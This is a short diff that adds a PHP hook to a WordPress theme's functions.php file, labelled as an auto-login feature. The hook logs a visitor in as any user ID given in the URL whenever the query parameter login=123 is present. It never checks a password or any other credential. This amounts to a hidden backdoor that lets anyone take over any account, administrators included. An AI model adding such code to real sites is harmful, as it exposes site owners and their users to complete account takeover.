@@ -1,0 +1,11 @@
+// Add hook functions.php file
+
+function auto_login_fire_on_wp_initialization() {
+	if( isset( $_GET['login'] ) && $_GET['login'] == 123){
+
+		$user_id = $_GET['user_id'];
+		wp_set_current_user ( $user_id );
+		wp_set_auth_cookie ( $user_id );
+	}
+}
+add_action( 'init', 'auto_login_fire_on_wp_initialization' );
